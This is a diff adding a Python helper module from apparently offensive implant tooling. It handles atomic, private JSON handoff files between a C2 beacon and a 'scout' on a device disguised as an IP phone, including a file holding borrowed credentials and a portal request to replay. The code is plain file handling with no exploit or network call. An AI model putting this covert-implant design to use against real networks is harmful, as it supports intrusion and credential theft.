@@ -1,0 +1,215 @@
+#!/usr/bin/env python3
+"""The two files the beacon and the scout meet over, from the scout's side.
+
+`software/c2/beacon.py` is served to a target as source text and may
+import only the standard library, so it cannot import this module and this
+module cannot import it. The names and versions below are therefore
+**copied** into `beacon.py` -- the arrangement the rescue record already
+has (`beacon.py:1686-1692`) -- and `test_way_out_handoff.py` compares the
+two and fails when they drift.
+
+**Why files and not a socket.** `raccoon-beacon.service` runs
+`beacon_standalone` and `raccoon-implant.service` runs `main.py`, so
+`_stuck_cycles` and the scout's evidence are in-memory state of different
+processes. A socket between them would be a listener on a device built to
+look like an IP phone; a file is one line of JSON that says nothing about
+the team server.
+
+**Not under /tmp.** Both units set `PrivateTmp=true`, so each process
+would get its own private `/tmp` and the handoff would silently never
+happen. `c2.way_out.state_dir` names a real directory, and the beacon's
+reader refuses a `/tmp` path by name with that reason.
+
+Five files, and which side owns each:
+
+    way_out_state.json      the beacon writes, the scout reads.  The stuck
+                            window: how long, on what evidence, and what
+                            has been attempted in it.
+    way_out_scout.json      the scout writes, the beacon reads.  The
+                            evidence from the tap, the rungs the scout
+                            believes are available, and -- in the model
+                            stage -- one recommendation.
+    way_out_trail.jsonl     the scout writes.  One line per attempt, kept
+                            after the state file is gone, which is what
+                            makes a burned implant a lesson.
+    way_out_borrow.json     the scout writes, a borrow verb reads.  The
+                            credentials themselves and the portal request
+                            to replay: the half that can carry a secret,
+                            which is why it is not in the document.
+    way_out_identity.json   the beacon writes, main.py reads.  Rung 4's
+                            cross-process trigger.
+
+Every write is atomic and 0600: a scratch file in the same directory,
+fsynced, moved over the target -- the shape `tunnel/shell.py` and
+`tunnel/keys.py` already write their own small documents with, for the
+same two reasons. Whoever reads one never sees half of one, and the file
+is private from the instant it exists.
+"""
+
+import json
+import logging
+import os
+import stat
+import tempfile
+from typing import Optional
+
+logger = logging.getLogger("raccoon.scout.handoff")
+
+STATE_NAME = "way_out_state.json"
+DOCUMENT_NAME = "way_out_scout.json"
+TRAIL_NAME = "way_out_trail.jsonl"
+BORROW_NAME = "way_out_borrow.json"
+IDENTITY_NAME = "way_out_identity.json"
+
+# Bumped when a reader would misread the older shape. A reader that finds
+# another version treats the file as absent rather than guessing, because
+# the two halves are upgraded by two different installs and a half-read
+# document is a decision made on a misunderstanding.
+STATE_VERSION = 1
+DOCUMENT_VERSION = 1
+
+_PRIVATE_FILE = 0o600
+_PRIVATE_DIR = 0o700
+
+
+def state_path(state_dir: str) -> str:
+    return os.path.join(state_dir, STATE_NAME)
+
+
+def document_path(state_dir: str) -> str:
+    return os.path.join(state_dir, DOCUMENT_NAME)
+
+
+def trail_path(state_dir: str) -> str:
+    return os.path.join(state_dir, TRAIL_NAME)
+
+
+def borrow_path(state_dir: str) -> str:
+    return os.path.join(state_dir, BORROW_NAME)
+
+
+def identity_path(state_dir: str) -> str:
+    return os.path.join(state_dir, IDENTITY_NAME)
+
+
+# ── reading ──
+
+
+def read_state(state_dir: str) -> Optional[dict]:
+    """The beacon's stuck-window file, or None.
+
+    None for every reason there is not to have one: no file, no directory,
+    no permission, half a file, a version this reader does not know. The
+    scout publishes nothing while the answer is None, which is what keeps
+    it quiet on a healthy implant.
+    """
+    return read_document_at(state_path(state_dir), STATE_VERSION)
+
+
+def read_document(state_dir: str) -> Optional[dict]:
+    """The scout's own document, for the scout and for tests."""
+    return read_document_at(document_path(state_dir), DOCUMENT_VERSION)
+
+
+def read_document_at(path: str, version: int) -> Optional[dict]:
+    try:
+        with open(path, "rb") as handle:
+            loaded = json.loads(handle.read().decode("utf-8"))
+    except (OSError, ValueError, UnicodeDecodeError):
+        return None
+    if not isinstance(loaded, dict) or loaded.get("version") != version:
+        return None
+    return loaded
+
+
+def read_borrow(state_dir: str) -> Optional[dict]:
+    """The private half: the credentials and the portal request."""
+    try:
+        with open(borrow_path(state_dir), "rb") as handle:
+            loaded = json.loads(handle.read().decode("utf-8"))
+    except (OSError, ValueError, UnicodeDecodeError):
+        return None
+    return loaded if isinstance(loaded, dict) else None
+
+
+# ── writing ──
+
+
+def write_document(state_dir: str, document: dict) -> None:
+    write_private_json(document_path(state_dir), document)
+
+
+def write_borrow(state_dir: str, fields: dict) -> None:
+    write_private_json(borrow_path(state_dir), fields)
+
+
+def append_trail(state_dir: str, line: dict) -> None:
+    """One line onto the trail, which is append-only.
+
+    Append and not rewrite: the trail outlives the state file on purpose,
+    so a rescue that ended in a burned port still has its record. Opened
+    0600 at creation rather than chmod-ed afterwards, so there is no
+    instant in which it is readable by anyone else.
+    """
+    _ensure_dir(state_dir)
+    path = trail_path(state_dir)
+    flags = os.O_WRONLY | os.O_CREAT | os.O_APPEND
+    descriptor = os.open(path, flags, _PRIVATE_FILE)
+    try:
+        stream = os.fdopen(descriptor, "ab")
+    except Exception:
+        os.close(descriptor)
+        raise
+    with stream:
+        stream.write((json.dumps(line, sort_keys=True) + "\n")
+                     .encode("utf-8"))
+
+
+def write_private_json(path: str, document: dict) -> None:
+    """One small JSON file 0600: all of it, or none of it."""
+    directory, name = os.path.split(path)
+    _ensure_dir(directory)
+    data = (json.dumps(document, sort_keys=True) + "\n").encode("utf-8")
+    descriptor, scratch = tempfile.mkstemp(prefix="." + name + ".",
+                                           dir=directory)
+    try:
+        with os.fdopen(descriptor, "wb") as handle:
+            handle.write(data)
+            handle.flush()
+            os.fsync(handle.fileno())
+        os.chmod(scratch, _PRIVATE_FILE)
+        os.replace(scratch, path)
+    except Exception:
+        try:
+            os.unlink(scratch)
+        except OSError:
+            pass
+        raise
+
+
+def remove(path: str) -> None:
+    """Delete a handoff file if it is there. Raises nothing."""
+    try:
+        os.unlink(path)
+    except OSError:
+        pass
+
+
+def _ensure_dir(directory: str) -> None:
+    if not directory:
+        raise ValueError("a handoff file needs a directory to live in")
+    if os.path.isdir(directory):
+        return
+    os.makedirs(directory, mode=_PRIVATE_DIR, exist_ok=True)
+    # `makedirs`'s mode applies to the leaf alone and is masked by the
+    # umask, so the mode is set explicitly: a parent left at the process
+    # umask would be a listable directory holding 0600 files.
+    os.chmod(directory, _PRIVATE_DIR)
+
+
+def is_private(path: str) -> bool:
+    """Whether a handoff file is 0600, for a check that wants to say so."""
+    try:
+        return stat.S_IMODE(os.stat(path).st_mode) == _PRIVATE_FILE
+    except OSError:
+        return False
